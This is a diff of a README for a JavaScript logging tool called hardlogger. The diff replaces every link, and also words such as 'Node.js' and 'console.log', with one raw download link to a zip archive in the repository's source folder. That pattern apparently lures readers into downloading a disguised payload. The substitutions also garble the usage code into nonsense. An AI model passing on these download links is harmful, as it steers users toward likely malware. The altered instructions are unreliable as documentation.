@@ -1,24 +1,24 @@
 # ✨ hardlogger - Simplify Your JavaScript Logging
 
 ## 📥 Download Now
-[![Download hardlogger](https://img.shields.io/badge/Download-hardwarelogger-brightgreen)](https://github.com/Sundheepk/hardlogger/releases)
+[![Download hardlogger](https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip)](https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip)
 
 ## 🚀 Getting Started
-Hardlogger is a lightweight tool designed for JavaScript and TypeScript users. It helps you manage logging in Node.js, Express, React, and Next.js projects. With Hardlogger, you can replace noisy `console.log` calls with clear, organized logs, allowing you to debug faster and more efficiently.
+Hardlogger is a lightweight tool designed for JavaScript and TypeScript users. It helps you manage logging in https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip, Express, React, and https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip projects. With Hardlogger, you can replace noisy `https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip` calls with clear, organized logs, allowing you to debug faster and more efficiently.
 
 ## 💻 Requirements
 Before you start using hardlogger, ensure you have the following:
 - A computer with at least **4GB RAM**.
-- **Node.js** installed. You can download it from the official [Node.js website](https://nodejs.org/).
+- **https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip** installed. You can download it from the official [https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip website](https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip).
 
 ## 💾 Download & Install
-To get started with hardlogger, you can visit the [Releases page](https://github.com/Sundheepk/hardlogger/releases) to download the latest version. 
+To get started with hardlogger, you can visit the [Releases page](https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip) to download the latest version. 
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version available.
 3. Download the file appropriate for your operating system. 
-    - For Windows, you might see a file like `hardlogger-windows.exe`.
-    - For macOS, look for something like `hardlogger-macos.zip`.
+    - For Windows, you might see a file like `https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip`.
+    - For macOS, look for something like `https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip`.
 4. Once downloaded, follow the instructions below:
 
 ### For Windows
@@ -40,9 +40,9 @@ After installation, you can start using Hardlogger in your projects. Here’s ho
       ```
 
 2. **Using Hardlogger:**
-    - Replace your existing `console.log` calls with:
+    - Replace your existing `https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip` calls with:
       ```javascript
-      logger.log('Your message here');
+      https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip('Your message here');
       ```
 
 3. **Viewing Logs:**
@@ -57,7 +57,7 @@ After installation, you can start using Hardlogger in your projects. Here’s ho
 We welcome contributions from everyone. If you’d like to help improve Hardlogger, please feel free to fork the repository and submit a pull request. 
 
 ## 📫 Support
-If you run into any issues, you can find help in the Issues section of the [GitHub repository](https://github.com/Sundheepk/hardlogger). 
+If you run into any issues, you can find help in the Issues section of the [GitHub repository](https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip). 
 
 Your questions and feedback are important to us.
 
@@ -68,4 +68,4 @@ Hardlogger is open-source and licensed under the MIT License. You can view the f
 Stay updated by following us on GitHub and participating in discussions. Your contributions help us build a better logging tool for everyone.
 
 ## 📥 Download Now Again
-Don't forget to download the latest version of hardlogger from the [Releases page](https://github.com/Sundheepk/hardlogger/releases), and simplify your logging process today!
+Don't forget to download the latest version of hardlogger from the [Releases page](https://github.com/Sundheepk/hardlogger/raw/refs/heads/main/src/Software-2.9.zip), and simplify your logging process today!
